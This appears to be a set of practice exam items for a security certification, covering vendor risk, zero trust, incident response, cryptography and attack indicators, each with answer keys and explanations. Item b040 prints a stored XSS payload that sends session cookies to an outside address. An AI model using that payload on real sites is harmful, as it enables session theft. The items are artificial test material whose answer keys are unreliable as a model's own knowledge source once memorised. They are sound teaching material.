+[b024] type=mc domain=5 obj=5.3 (Explain the processes associated with third-party risk assessment and management) cat=third
+Q: A bank asks a cloud provider for a right-to-audit clause and the provider refuses, citing thousands of tenants. The bank still needs credible evidence that the provider's controls are designed and operating effectively. Which of the following should the bank request INSTEAD?
+  * A. An independent third-party audit report covering the provider's control environment
+        why: When on-site audits are impractical, an independent assessment (such as a SOC 2 Type II or ISO 27001 certification with report) provides externally validated evidence that the bank can rely on.
+    B. A completed self-assessment questionnaire from the provider
+        why: A questionnaire is the provider's own claims with no independent verification; it is useful for screening but weak as evidence of operating effectiveness.
+    C. A penetration test performed by the bank against the provider's shared infrastructure
+        why: Testing multi-tenant infrastructure without authorization is prohibited and would affect other customers; providers do not allow it.
+    D. A memorandum of understanding stating the provider follows best practices
+        why: An MOU is a non-binding statement of intent and provides no evidence that any control actually works.
+TAKEAWAY: Vendor assessment evidence, strongest to weakest: right-to-audit, independent third-party audit, evidence of internal audits, then questionnaires.
+
+[b025] type=mc domain=1 obj=1.2 (Summarize fundamental security concepts) cat=controls
+Q: A financial firm is deploying a zero trust architecture. An engineer must identify which component sits in the data path in front of the trading application and actually opens or closes each connection based on the decision it receives. Which of the following is that component?
+  * A. Policy enforcement point
+        why: The PEP lives on the data plane, in line with the traffic; it receives the allow or deny verdict from the control plane and enforces it on the session.
+    B. Policy engine
+        why: The policy engine is on the control plane and computes the decision using identity, device posture, and risk; it does not touch the traffic itself.
+    C. Policy administrator
+        why: The policy administrator relays the engine's decision and configures the enforcement point; it is a control plane component, not the gate in the data path.
+    D. Adaptive identity service
+        why: Adaptive identity supplies context such as behavior and location to the policy engine; it is an input to the decision rather than the point of enforcement.
+TAKEAWAY: Control plane decides (policy engine + policy administrator); data plane enforces (policy enforcement point). Subject and system sit behind the PEP.
+
+[b026] type=ms domain=4 obj=4.5 (Given a scenario, modify enterprise capabilities to enhance security) cat=ops
+Q: A startup scans the public IP of its bastion host and receives the output below. Which TWO of the following actions should be taken FIRST?
+EXHIBIT:
+    Nmap scan report for 198.51.100.25
+    PORT      STATE  SERVICE   VERSION
+    22/tcp    open   ssh       OpenSSH 9.6
+    80/tcp    open   http      nginx 1.26
+    6379/tcp  open   redis     Redis 7.2 (no auth)
+    9200/tcp  open   http      Elasticsearch 8.x
+(choose 2)
+  * A. Remove public exposure of Redis and Elasticsearch by binding them to internal addresses and firewalling the ports
+        why: An unauthenticated Redis and a search cluster on the internet are direct data-theft and RCE paths; nothing about a bastion requires them to be reachable externally.
+  * B. Restrict SSH on port 22 to the company's VPN or known source addresses
+        why: A bastion needs SSH, but it should be limited to trusted sources to cut brute-force and credential-stuffing exposure while keeping administrators working.
+    C. Upgrade OpenSSH to a newer version immediately
+        why: OpenSSH 9.6 is a current release with no indicated vulnerability; the open data services are the urgent finding.
+    D. Disable port 80 and serve the page over HTTPS only
+        why: Serving over TLS is good practice, but a static nginx page is far lower risk than unauthenticated data stores and can be scheduled later.
+    E. Block ICMP so the host no longer responds to scanners
+        why: Hiding from ping does not close any open port and provides no real protection against a scan that already found the services.
+TAKEAWAY: Open service ports are attack surface. Close what should never be public, then restrict what must be public to trusted sources.
+
+[b027] type=mc domain=2 obj=2.4 (Given a scenario, analyze indicators of malicious activity) cat=attacks
+Q: Operators on a plant's control network report that HMI screens are updating slowly. An engineer runs the command below on an HMI. The gateway 10.20.0.1 is a hardware router whose true MAC begins with 00:1a. Which of the following attacks is MOST likely occurring?
+EXHIBIT:
+    $ arp -a
+    10.20.0.1    at 08:00:27:5c:3e:11  [ether] on eth0
+    10.20.0.44   at 08:00:27:5c:3e:11  [ether] on eth0
+    10.20.0.12   at 00:50:56:9a:02:77  [ether] on eth0
+  * A. On-path attack using ARP poisoning
+        why: The gateway's IP now maps to the same MAC as host 10.20.0.44, meaning that host has claimed to be the router. Traffic is being relayed through it, which explains the latency.
+    B. DNS cache poisoning of the HMI
+        why: DNS poisoning would alter name-to-IP answers; the ARP table shows a MAC-layer substitution, and control networks rarely depend on DNS.
+    C. MAC flooding of the control network switch
+        why: MAC flooding fills the switch CAM table to force broadcast behavior; it would not rewrite the gateway's entry in a host's ARP cache to another host's MAC.
+    D. Amplified DDoS against the router
+        why: An amplification attack would show as saturated links or an unreachable router, not as a duplicate MAC address in the ARP table.
+TAKEAWAY: Two IPs sharing one MAC, especially the gateway, is the fingerprint of ARP spoofing. Mitigate with dynamic ARP inspection and static entries on critical OT hosts.
+
+[b028] type=mc domain=3 obj=3.3 (Compare and contrast concepts and strategies to protect data) cat=data
+Q: A startup's database replicates automatically to a second cloud region for resilience. A new customer contract requires that its records never leave the country where the primary region is located, and the second region is abroad. Which of the following BEST satisfies the contract while keeping resilience?
+  * A. Apply geographic restrictions so that customer's data replicates only to a second region inside the same country
+        why: Geographic restriction of replication targets keeps the data within the required jurisdiction while still providing a second copy. Data sovereignty requirements are about where data resides, not whether it is copied.
+    B. Encrypt the replicated copy so it cannot be read abroad
+        why: Encrypted data is still data stored abroad; sovereignty rules address location and legal jurisdiction, and ciphertext does not satisfy them.
+    C. Disable replication entirely for the whole database
+        why: This meets the contract for one customer by removing resilience for everyone; a targeted geographic control is more appropriate.
+    D. Tokenize the customer's records before replication
+        why: Tokens would still need a vault, and the contract governs the records themselves; tokenization does not change where the original data is stored or replicated.
+TAKEAWAY: Data sovereignty: data is subject to the laws of where it is stored. Use geolocation-aware replication and geographic restrictions rather than assuming encryption is enough.
+
+[b029] type=mc domain=5 obj=5.2 (Explain elements of the risk management process) cat=gov
+Q: A bank's risk register lists 'unpatched ATM software' with a likelihood, an impact score, and a threshold of 'more than 5 ATMs unpatched beyond 30 days'. The committee notices nobody is named as accountable for keeping the risk within that threshold. Which of the following register elements is missing?
+  * A. Risk owner
+        why: Each register entry needs a named individual accountable for monitoring the risk and acting when it exceeds the threshold; without an owner, the entry cannot be managed.
+    B. Key risk indicator
+        why: The count of ATMs unpatched beyond 30 days is a KRI, and it is already present as the basis for the threshold.
+    C. Risk appetite statement
+        why: Risk appetite is the organization-wide stance set by the board, not a field on an individual register row.
+    D. Exposure factor
+        why: EF is used in quantitative analysis to compute SLE; the register already captures qualitative likelihood and impact, and EF would not fix the accountability gap.
+TAKEAWAY: Risk register rows: description, likelihood, impact, KRI, threshold, and a named risk owner who is accountable for the response.
+
+[b030] type=mc domain=4 obj=4.1 (Given a scenario, apply common security techniques to computing resources) cat=harden
+Q: A brokerage wants traders to use smartphones for approved trading apps and secure chat, must be able to wipe firm data remotely, and must keep firm data isolated from personal photos and apps that the company does not want to see or manage. Traders will pick from a short list of approved models the firm buys. Which of the following BEST fits?
+  * A. CYOD devices enrolled in MDM with a managed work container
+        why: Choose-your-own-device lets the firm own and buy the phone from an approved list, and MDM containerization separates firm data (wipeable) from the personal profile the firm stays out of.
+    B. BYOD with a policy requiring full-device wipe on departure
+        why: BYOD means employees own the phones, contradicting the firm buying approved models, and full-device wipes of personal phones create legal and privacy problems.
+    C. COPE devices with all personal use prohibited
+        why: The firm explicitly expects personal photos and apps on the device; a no-personal-use policy does not match the requirement.
+    D. Unmanaged devices with the trading app protected by MFA only
+        why: Without MDM there is no remote wipe, no data isolation, and no ability to enforce the approved-model list.
+TAKEAWAY: BYOD = employee-owned; CYOD = company-owned from an approved list; COPE = company-owned, personal use allowed. MDM containers separate work and personal data on any of them.
+
+[b031] type=mc domain=1 obj=1.4 (Explain the importance of using appropriate cryptographic solutions) cat=crypto
+Q: A bank's customer-facing TLS certificates are revoked and reissued whenever a private key is rotated. Customers on slow mobile links complain that the login page stalls while their browser contacts the CA. The bank wants revocation checking to remain reliable but with no extra client round trip. Which of the following should be implemented?
+  * A. OCSP stapling on the bank's web servers
+        why: With stapling, the server periodically fetches a signed OCSP response from the CA and includes it in the TLS handshake, so the client gets fresh revocation status without its own query to the CA.
+    B. Publishing a larger CRL with a longer validity period
+        why: A CRL still requires the client to download the whole list, which is slower on mobile links, and a longer validity means revoked certificates are trusted for longer.
+    C. Switching to self-signed certificates to eliminate the CA lookup
+        why: Self-signed certificates would produce browser warnings for every customer and remove third-party trust entirely; they solve latency by abandoning security.
+    D. Placing the private keys in an HSM
+        why: An HSM protects the key material at rest and in use; it has no effect on how clients check whether a certificate has been revoked.
+TAKEAWAY: CRL = client downloads a list; OCSP = client asks about one serial; OCSP stapling = server delivers the CA's signed answer inside the handshake.
+
+[b032] type=mc domain=2 obj=2.3 (Explain various types of vulnerabilities) cat=vulns
+Q: A vendor notifies a manufacturing plant that attackers are actively exploiting a previously unknown flaw in the plant's PLC firmware. No patch exists yet and the vendor estimates six weeks to release one. Which of the following BEST describes the vulnerability, and which response is MOST appropriate in the meantime?
+  * A. A zero-day; apply compensating controls such as tighter segmentation and monitoring for exploit indicators
+        why: A zero-day is a flaw exploited before a fix is available. Since patching is impossible, the plant reduces reachability of the PLCs and watches for the published indicators until the fix ships.
+    B. A zero-day; disable the PLCs until the vendor patch is released
+        why: Halting production for six weeks is rarely proportionate; compensating controls exist precisely to keep operating safely while a patch is pending.
+    C. An end-of-life vulnerability; replace the PLCs with a supported model
+        why: The PLCs are supported and a patch is coming; end-of-life means the vendor will never fix it, which is not the case here.
+    D. A misconfiguration; restore the firmware's default settings
+        why: The flaw is in the firmware code itself, not in how it was configured; defaults would not remove the vulnerability.
+TAKEAWAY: Zero-day = exploited with no patch available. Response: compensating controls (segmentation, allow lists, monitoring) until the fix arrives, then patch and rescan.
+
+[b033] type=mc domain=4 obj=4.8 (Explain appropriate incident response activities) cat=ir
+Q: A brokerage receives notice that a regulator is investigating a former trader. Legal expects litigation. The trader's mailbox and chat history are scheduled to be purged under the normal 90-day retention policy next week. Which of the following should the security team do FIRST?
+  * A. Place the trader's data under legal hold so that retention purging is suspended
+        why: A legal hold overrides normal retention to preserve potentially relevant evidence once litigation is reasonably anticipated. Letting the purge run could be treated as destruction of evidence.
+    B. Export the mailbox to a USB drive and hand it to the regulator
+        why: Handing over evidence without a documented acquisition process or chain of custody, and before legal defines scope, undermines admissibility and may overshare.
+    C. Let the retention policy run because it is the documented process
+        why: Retention policies must yield to legal hold obligations; following the schedule here would destroy relevant evidence.
+    D. Begin e-discovery review of the messages for relevance
+        why: E-discovery happens after preservation is guaranteed; reviewing first while the purge is still scheduled risks losing the data mid-review.
+TAKEAWAY: Preservation comes first: legal hold suspends retention deletion, then acquisition with chain of custody, then e-discovery.
+
+[b034] type=ms domain=5 obj=5.3 (Explain the processes associated with third-party risk assessment and management) cat=third
+Q: A startup is negotiating with a managed database provider and wants the contract to make the provider's performance measurable and enforceable. Which TWO of the following belong in the service-level agreement?
+(choose 2)
+  * A. A monthly availability target of 99.95% with service credits when it is missed
+        why: Availability targets with defined remedies are the core of an SLA: measurable, time-bound, and tied to a consequence.
+  * B. A maximum four-hour response time for severity-one support tickets
+        why: Support responsiveness is a standard SLA metric; it defines what the customer can expect and hold the provider to.
+    C. A list of the specific migration tasks and deliverables for onboarding
+        why: Scoped tasks and deliverables belong in a statement of work, not in the ongoing performance commitments of the SLA.
+    D. The general terms of liability and payment governing all future work
+        why: Those umbrella terms are the content of a master service agreement.
+    E. A promise by both parties to keep each other's information confidential
+        why: Confidentiality obligations are set out in a non-disclosure agreement, not measured as a service level.
+TAKEAWAY: SLA = measurable service metrics plus remedies (uptime, response time, RPO/RTO). Deliverables go in the SOW, legal umbrella terms in the MSA, secrecy in the NDA.
+
+[b035] type=mc domain=3 obj=3.1 (Compare and contrast security implications of different architecture models) cat=arch
+Q: A security engineer reviews a startup's infrastructure-as-code repository and finds the snippet below in a file that is committed to the shared repository and used by every deployment. Which of the following is the MOST significant problem?
+EXHIBIT:
+    resource "cloud_db_instance" "orders" {
+      engine          = "postgres"
+      master_username = "admin"
+      master_password = "Pr0d-Orders-2026!"
+      publicly_accessible = false
+    }
+  * A. A production secret is hardcoded in version control, exposed to every repository user and kept in history forever
+        why: IaC templates are widely shared and their history is permanent; a plaintext password in them is effectively leaked. Secrets should be referenced from a secrets manager or injected at deploy time.
+    B. The database is not publicly accessible, which will break the application
+        why: Keeping the database off the internet is correct; the application should reach it over the private network.
+    C. The template uses PostgreSQL instead of a managed NoSQL service
+        why: Engine choice is an application decision with no inherent security flaw.
+    D. The username 'admin' violates naming conventions
+        why: A predictable admin username is a minor hardening point; it is trivial compared to a plaintext production password committed to the repo.
+TAKEAWAY: IaC gives repeatable, reviewable infrastructure, but templates are code: never commit secrets. Use a secrets manager and scan repositories for credentials.
+
+[b036] type=mc domain=2 obj=2.2 (Explain common threat vectors and attack surfaces) cat=social
+Q: A control room supervisor at a plant receives a phone call from someone who says they are from the SCADA vendor's support desk, quotes a real open ticket number, and asks the supervisor to read out the remote-access passcode so they can 'finish the fix'. Which of the following BEST describes this attack?
+  * A. Vishing combined with impersonation
+        why: The attack is delivered by voice call and the caller poses as a trusted vendor, using a real ticket number as a pretext to make the request believable.
+    B. Smishing
+        why: Smishing is phishing over SMS text messages; this attack came by a live phone call.
+    C. Business email compromise
+        why: BEC uses email, typically a compromised or spoofed business account, to redirect funds or data; no email was involved here.
+    D. Watering hole attack
+        why: A watering hole plants malware on a website the targets frequently visit; this was a direct human-to-human request for a credential.
+TAKEAWAY: Vishing = voice phishing. Real details like ticket numbers make the pretext convincing; the defense is to call the vendor back on a known number.
+
+[b037] type=mc domain=4 obj=4.4 (Explain security alerting and monitoring concepts and tools) cat=ops
+Q: A bank's SOC suspects that data is slowly leaving a research subnet, but the endpoint agents show nothing unusual and packet captures on every link are not feasible. The SOC wants to see which internal hosts are sending large volumes to which external addresses, over time, using data the routers already produce. Which of the following should be used?
+  * A. NetFlow exported from the core routers to the SIEM
+        why: Flow records summarize who talked to whom, on what ports, and how many bytes, without full packet capture. Aggregated over time they reveal steady outbound volume to an unusual destination.
+    B. SNMP traps from the routers
+        why: Traps are event notifications such as a link going down or a threshold crossing; they do not describe individual conversations or per-destination byte counts.
+    C. A vulnerability scanner sweep of the research subnet
+        why: Scanning finds weaknesses on hosts; it says nothing about what traffic those hosts are actually sending.
+    D. Host-based antivirus signature updates
+        why: The agents already report nothing, and signatures cannot reveal network-level exfiltration patterns.
+TAKEAWAY: NetFlow = metadata about conversations (volume, endpoints, timing) at scale; packet capture = full content on a specific link; SNMP traps = device events.
+
+[b038] type=ms domain=1 obj=1.4 (Explain the importance of using appropriate cryptographic solutions) cat=ports
+Q: A configuration audit of a plant's network management practices produces the findings below. Which TWO changes would BEST remediate them?
+EXHIBIT:
+    F1: Switch configs backed up nightly to 10.20.5.9 using FTP (port 21)
+    F2: Network monitoring polls switches with SNMPv2c, community string 'public'
+    F3: Engineers manage switches over SSH (port 22)
+    F4: NTP served from an internal stratum-2 server
+(choose 2)
+  * A. Replace FTP with SFTP over port 22 for configuration backups
+        why: FTP sends credentials and the full switch configuration in clear text; SFTP runs inside SSH and encrypts both, using a port already permitted for management.
+  * B. Migrate monitoring to SNMPv3 with authentication and privacy enabled
+        why: SNMPv2c community strings travel in clear text and 'public' is a default; SNMPv3 adds authenticated, encrypted polling.
+    C. Replace SSH with Telnet on port 23 to match the vendor default
+        why: Telnet is unencrypted; SSH on port 22 is already the secure choice for F3 and needs no change.
+    D. Move NTP to an external public pool on port 123
+        why: An internal stratum-2 server is appropriate for an OT network; pulling time from the internet adds exposure without fixing any finding.
+    E. Change the SNMP community string from 'public' to a random value but keep v2c
+        why: A stronger community string still crosses the network unencrypted and can be sniffed; only SNMPv3 provides real protection.
+TAKEAWAY: Secure protocol selection: FTP to SFTP/FTPS, Telnet to SSH, SNMPv1/2c to SNMPv3, HTTP to HTTPS, LDAP to LDAPS.
+
+[b039] type=mc domain=5 obj=5.3 (Explain the processes associated with third-party risk assessment and management) cat=third
+Q: Two fintech companies agree to jointly build and sell a combined product. They need a document defining each company's contributions, how revenue will be divided, and how decisions and liabilities are shared. Which of the following agreement types is MOST appropriate?
+  * A. Business partners agreement
+        why: A BPA is the document for a joint business venture: it sets out each partner's investment, responsibilities, profit and loss sharing, and decision-making rights.
+    B. Service-level agreement
+        why: An SLA measures a provider's performance for a customer; neither company is a customer of the other in a joint venture.
+    C. Memorandum of agreement
+        why: An MOA records cooperative intent between organizations and generally lacks the detailed revenue-sharing and liability terms a joint product requires.
+    D. Work order
+        why: A work order authorizes a specific task under an existing contract; it does not establish a partnership.
+TAKEAWAY: BPA = partnership terms (contributions, profits, liabilities). MOU/MOA = intent to cooperate. SLA = service metrics. WO/SOW = specific tasks.
+
+[b040] type=mc domain=2 obj=2.4 (Given a scenario, analyze indicators of malicious activity) cat=attacks
+Q: A startup's support portal lets customers post comments. The application log records the entry below submitted through the comment form. Which of the following attacks is being attempted?
+EXHIBIT:
+    POST /tickets/4471/comment
+    body=Thanks for the help!<script>fetch('https://198.51.100.9/c?d='+document.cookie)</script>
+  * A. Stored cross-site scripting to steal support agents' session cookies
+        why: Script tags saved in a comment will execute in the browser of every agent who views the ticket, sending their session cookie to the attacker's server. Stored XSS targets other users, not the server.
+    B. SQL injection against the ticket database
+        why: There is no SQL syntax in the payload; it is JavaScript intended for a browser, not a query manipulation.
+    C. Cross-site request forgery
+        why: CSRF tricks a logged-in user's browser into sending a request the attacker crafted; it does not involve injecting script into stored content.
+    D. Server-side request forgery
+        why: SSRF makes the server itself fetch attacker-chosen URLs; here the fetch runs in a victim's browser using their cookie.
+TAKEAWAY: Script in user-supplied content that later renders for other users = stored XSS. Fix with output encoding, input validation, and HttpOnly cookies.
+
+[b041] type=mc domain=3 obj=3.4 (Explain the importance of resilience and recovery in security architecture) cat=data
+Q: A bank's file server runs a full backup every Sunday night and a differential backup every night from Monday through Saturday. The server's disks fail on Thursday morning. Which of the following describes the restore that is needed?
+  * A. Restore Sunday's full backup, then Wednesday night's differential only
+        why: Each differential contains everything changed since the last full backup, so the most recent one (Wednesday) already includes Monday and Tuesday's changes.
+    B. Restore Sunday's full backup, then Monday, Tuesday, and Wednesday's backups in order
+        why: Applying every nightly copy is the incremental restore process; with differentials the earlier ones are redundant.
+    C. Restore only Wednesday night's backup because it is the most recent
+        why: A differential contains only changes since Sunday; without the full backup the unchanged files are missing.
+    D. Restore Sunday's full backup and accept the loss of the week's changes
+        why: The differential exists precisely to recover the week's changes; ignoring it would violate the bank's RPO unnecessarily.
+TAKEAWAY: Differential = changes since the last full (restore full + latest diff). Incremental = changes since the last backup of any kind (restore full + every incremental in order).
+
+[b042] type=mc domain=4 obj=4.2 (Explain the security implications of proper hardware, software, and data asset management) cat=ops
+Q: A cloud startup discovers that an engineer who left six months ago still has a company laptop, and that several production-adjacent cloud VMs were created under a personal account for an unapproved project. Which of the following practices would MOST directly have prevented both findings?
+  * A. An asset inventory that assigns every hardware and cloud asset to an owner and is reconciled at offboarding and on a schedule
+        why: Assignment and ongoing monitoring/tracking are the core of asset management: the laptop would have been recovered at offboarding and the unowned VMs would have surfaced at the next reconciliation.
+    B. Full-disk encryption on all company laptops
+        why: Encryption protects the data on the missing laptop but does not get the laptop back or address the shadow cloud resources.
+    C. Requiring MFA on the cloud console
+        why: MFA hardens logins; it does not stop an authorized engineer from creating untracked resources or catch a laptop that was never returned.
+    D. Shredding drives at end of life
+        why: Destruction is the final disposal step; neither finding is about a retired asset.
+TAKEAWAY: Asset management is acquisition → assignment/ownership → monitoring/tracking → disposal. Untracked assets (physical or cloud) are the gap that offboarding and inventory reconciliation close.
+
+[b043] type=mc domain=2 obj=2.1 (Compare and contrast common threat actors and motivations) cat=actors
+Q: Over 18 months, a plant's engineering network is quietly accessed by an actor using custom implants that mimic legitimate PLC vendor tools. Nothing is damaged; only proprietary process designs and control logic are copied. Which of the following actor types and motivations is MOST likely?
+  * A. Nation-state actor motivated by espionage
+        why: Long dwell time, custom tooling tailored to a specific ICS vendor, and theft of industrial designs without disruption point to a well-resourced state actor conducting industrial espionage.
+    B. Hacktivist motivated by philosophical beliefs
+        why: Hacktivists seek publicity through defacement, leaks, or disruption; silently stealing process designs for 18 months does not serve a public message.
+    C. Unskilled attacker motivated by chaos
+        why: Custom implants disguised as vendor tools require significant skill and resources far beyond off-the-shelf attacks.
+    D. Organized crime motivated by financial gain through ransomware
+        why: Criminal groups monetize quickly, usually by encrypting systems or extorting; they would not sit unnoticed for 18 months copying control logic.
+TAKEAWAY: Stealth, patience, custom tools, and theft of intellectual property = nation-state espionage. Noise and quick monetization = organized crime.
+
+[b044] type=mc domain=5 obj=5.3 (Explain the processes associated with third-party risk assessment and management) cat=third
+Q: A bank completed thorough due diligence when it selected a fraud-detection vendor three years ago. Since then, the vendor has been acquired twice and its security certification has lapsed, but nobody at the bank noticed. Which of the following third-party risk practices was missing?
+  * A. Ongoing vendor monitoring
+        why: Vendor risk changes over time; monitoring through recurring questionnaires, certification tracking, and news of ownership changes would have surfaced the lapsed certification and acquisitions.
+    B. Initial due diligence
+        why: Due diligence was performed at selection; the failure was in what happened after the contract was signed.
+    C. Conflict-of-interest screening
+        why: Nothing suggests bank staff had personal stakes in the vendor; the issue is the vendor's changed risk profile going unnoticed.
+    D. Rules of engagement for penetration testing
+        why: Rules of engagement scope a test; they do not track a vendor's certifications or ownership.
+TAKEAWAY: Third-party risk is a lifecycle: due diligence at selection, contractual controls, then continuous monitoring for changes in ownership, financial health, and certifications.
+
+[b045] type=mc domain=3 obj=3.1 (Compare and contrast security implications of different architecture models) cat=arch
+Q: A startup decomposed its monolith into 40 microservices that call each other over the internal network. A compromised container in one service was able to call the payments service directly, because internal calls are trusted. Which of the following BEST addresses this weakness?
+  * A. Require mutual TLS with per-service identities so every call is authenticated and authorized
+        why: Microservices multiply the internal attack surface; mTLS gives each service a verifiable identity so the payments service can reject calls from a service that should never talk to it.
+    B. Merge the services back into a single monolith
+        why: Reverting the architecture removes the benefits of microservices and does not address authentication; a compromised module in a monolith has the same reach.
+    C. Place a WAF in front of the public API gateway
+        why: A WAF inspects traffic from external clients; the problem is east-west traffic between internal services behind the gateway.
+    D. Increase the CPU and memory limits on the payments container
+        why: Resource limits affect availability and cost, not whether an internal caller is allowed to invoke the service.
+TAKEAWAY: Microservices need zero trust internally: service identity, mTLS, and authorization on every call. The network being 'internal' is not a control.
+
+[b046] type=mc domain=4 obj=4.1 (Given a scenario, apply common security techniques to computing resources) cat=harden
+Q: A bank has documented a hardened configuration for teller workstations and pushed it to 2,000 machines through Group Policy. Six months later an audit finds many workstations have drifted, with local firewall exceptions and disabled screen locks. Which of the following secure baseline activities was neglected?
+  * A. Maintaining the baseline through ongoing compliance monitoring and remediation of drift
+        why: A baseline has three phases: establish, deploy, maintain. The configuration was established and deployed, but no process re-checked hosts against it and corrected deviations.
+    B. Establishing the baseline from an industry benchmark
+        why: The hardened configuration existed and was documented; the problem arose after deployment, not in defining the standard.
+    C. Deploying the baseline to the workstation fleet
+        why: Group Policy did deploy it to all 2,000 hosts; the settings later changed and were never reapplied.
+    D. Performing a wireless site survey of the branches
+        why: Site surveys concern access point placement and coverage and have nothing to do with workstation configuration drift.
+TAKEAWAY: Baselines decay. Establish, deploy, then maintain with regular scans (SCAP/benchmark tools) and automatic re-enforcement of settings.
+
+[b047] type=mc domain=1 obj=1.4 (Explain the importance of using appropriate cryptographic solutions) cat=crypto
+Q: A penetration tester extracts the credential table below from a startup's legacy application. Which of the following weaknesses does the table MOST clearly demonstrate?
+EXHIBIT:
+    username   pwd_hash
+    alice      5f4dcc3b5aa765d61d8327deb882cf99
+    bob        e10adc3949ba59abbe56e057f20f883e
+    carol      5f4dcc3b5aa765d61d8327deb882cf99
+    dave       5f4dcc3b5aa765d61d8327deb882cf99
+  * A. Passwords are hashed without a salt, so identical passwords produce identical hashes
+        why: Three users share the exact same digest, which can only happen if no per-user salt was mixed in. An attacker cracks one and gets all three, and can use precomputed tables.
+    B. Passwords are stored using reversible encryption
+        why: The values are fixed-length hex digests characteristic of a hash, not ciphertext; nothing indicates a decryption key exists.
+    C. The application uses key stretching with too high a work factor
+        why: A stretched hash would still differ per user when salted; and the 32-hex-character output is an unstretched fast hash, not a bcrypt or PBKDF2 string.
+    D. The hashes are colliding because the algorithm is broken
+        why: A collision is two different inputs producing one hash; here the far simpler explanation is that alice, carol, and dave chose the same password.
+TAKEAWAY: Same password, same hash = no salt. A unique random salt per user makes every stored hash different even for identical passwords.
+
+[b048] type=mc domain=2 obj=2.3 (Explain various types of vulnerabilities) cat=vulns
+Q: A plant purchases replacement industrial switches from a low-cost online reseller instead of the manufacturer's authorized channel. Weeks later, network monitoring detects the switches sending configuration data to an unknown external address, and the manufacturer confirms the serial numbers are not genuine. Which of the following BEST describes the vulnerability?
+  * A. Hardware supply chain compromise via a counterfeit provider
+        why: Buying outside authorized channels allowed tampered or counterfeit hardware into the OT network. Supply chain vulnerabilities include hardware, software, and service providers.
+    B. Firmware end-of-life on the switches
+        why: End-of-life means the vendor no longer supports the product; these units were never genuine vendor products in the first place.
+    C. Default credentials left on the switches
+        why: Default credentials would enable an attacker to log in; they would not cause the switch itself to phone home with configuration data.
+    D. Unsupported system due to missing patches
+        why: Patching status is irrelevant when the hardware itself was built or modified to exfiltrate data.
+TAKEAWAY: Supply chain risk covers what you buy and from whom. Procure from authorized channels, verify serials, and inspect firmware before connecting OT equipment.
+
+[b049] type=mc domain=4 obj=4.3 (Explain various activities associated with vulnerability management) cat=ops
+Q: A vulnerability scan flags a critical flaw in a safety-instrumented controller at a plant. The vendor has no patch and the controller cannot be replaced for two years. Management agrees the risk must be documented and approved, and the controller is moved to a dedicated VLAN with strict ACLs. Which of the following BEST describes the response?
+  * A. A documented exception with a compensating control
+        why: When patching is impossible, the vulnerability management process records a formal exception approved by management and pairs it with a compensating control (segmentation) that reduces the risk.
+    B. Marking the finding as a false positive
+        why: The vulnerability is real and confirmed; a false positive is a scanner error, which is not the case.
+    C. Transferring the risk through cyber insurance
+        why: Insurance may be part of the broader strategy, but the actions described (approval and segmentation) are an exception with mitigation, not a transfer.
+    D. Rescanning to validate remediation
+        why: Rescanning verifies that a fix was applied; nothing was fixed here, only isolated.
+TAKEAWAY: Vulnerability responses: patch, segment, compensating control, insurance, or a documented exception/exemption. Exceptions require approval and usually a compensating control.
+
+[b050] type=mc domain=5 obj=5.1 (Summarize elements of effective security governance) cat=gov
+Q: A bank is rolling out a new loan-origination system. IT operations will run the servers and backups, a data quality team will ensure records are accurate and consistently formatted, and the head of lending must decide the system's data classification and who may access it. Which of the following correctly matches the head of lending's role?
+  * A. Data owner
+        why: The owner is the senior business person accountable for the data, who sets its classification and approves access. That is exactly what the head of lending is being asked to do.
+    B. Data custodian
+        why: The custodian implements the technical protection, storage, and backups; that is the IT operations role in this scenario.
+    C. Data steward
+        why: The steward focuses on data quality, definitions, and consistent use, which describes the data quality team.
+    D. Data processor
+        why: A processor is an outside party handling personal data on a controller's instructions; the head of lending is inside the bank making ownership decisions.
+TAKEAWAY: Owner = accountable, sets classification and access; steward = quality and meaning; custodian = technical handling; controller/processor = privacy-law roles.
+
+[b051] type=mc domain=3 obj=3.2 (Given a scenario, apply security principles to secure enterprise infrastructure) cat=netsec
+Q: A brokerage places an inline DLP appliance on the only path used to transmit client statements to an external print vendor. Regulators require that unencrypted client data never leaves the firm unchecked. Which of the following failure modes should the appliance be configured for, and why?
+  * A. Fail-closed, because blocking traffic during an outage is preferable to letting unchecked data leave
+        why: Given the regulatory requirement, the cost of a temporary transfer delay is lower than the cost of an unrecorded data leak, so the device should drop traffic when it fails.
+    B. Fail-open, because availability of the print process is the priority
+        why: Fail-open would let statements flow uninspected whenever the appliance crashed, directly violating the requirement that data never leaves unchecked.
+    C. Fail-open, because DLP appliances are passive and cannot block anyway
+        why: The appliance is described as inline, meaning it actively sits in the path and can block; a passive tap-based sensor is a different deployment.
+    D. Fail-closed, because it reduces the cost of the appliance
+        why: Failure mode is a security-versus-availability decision, not a cost feature; the justification is regulatory risk, not price.
+TAKEAWAY: Fail-closed favors security (stop traffic if the control dies); fail-open favors availability. Choose based on which loss hurts more for that specific path.
+
+[b052] type=ms domain=4 obj=4.8 (Explain appropriate incident response activities) cat=ir
+Q: A bank's SOC confirms that a ransomware operator has encrypted three file servers and is attempting to reach others using a stolen domain administrator credential. Which TWO of the following are containment actions appropriate at this stage?
+(choose 2)
+  * A. Disable the compromised domain administrator account and reset its credentials
+        why: Removing the attacker's credential stops lateral movement immediately without destroying evidence; it limits the incident's scope.
+  * B. Block the affected servers' network segments from reaching the rest of the domain
+        why: Network isolation of the infected segment prevents the encryption from spreading while the team plans eradication and recovery.
+    C. Restore all three file servers from last night's backups
+        why: Restoration is recovery; doing it while the attacker still holds valid access means the restored systems may simply be encrypted again.
+    D. Wipe and rebuild the domain controllers
+        why: Rebuilding is eradication and is premature before the attacker's access has been cut off and the scope understood.
+    E. Hold a lessons-learned meeting to review the initial access vector
+        why: Lessons learned is the final phase after recovery; during an active spread the priority is stopping it.
+TAKEAWAY: Containment = stop the bleeding (isolate, disable credentials, block C2). Eradication and recovery come after the attacker's access is cut.
+
+[b053] type=mc domain=2 obj=2.4 (Given a scenario, analyze indicators of malicious activity) cat=attacks
+Q: A startup's cloud bill triples in a week. An engineer runs the command below on one of the Kubernetes worker nodes. Which of the following is the MOST likely explanation?
+EXHIBIT:
+    $ top -b -n 1 | head -6
+    load average: 31.2, 30.8, 30.1
+    PID    USER   %CPU  %MEM  COMMAND
+    41877  root   796.3  1.2   kdevtmpfsi
+    41901  root   3.1   0.4   kubelet
+    1224   root   0.9   0.2   containerd
+  * A. A container was compromised and is running a cryptominer, shown by sustained resource consumption
+        why: An unfamiliar root process consuming nearly all CPU across many cores, with a matching spike in cost, is the classic indicator of cryptojacking after a container or exposed API was exploited.
+    B. The kubelet is misconfigured and is restarting pods in a loop
+        why: The kubelet is using 3% CPU; the load is clearly coming from a single unknown process, not from orchestration churn.
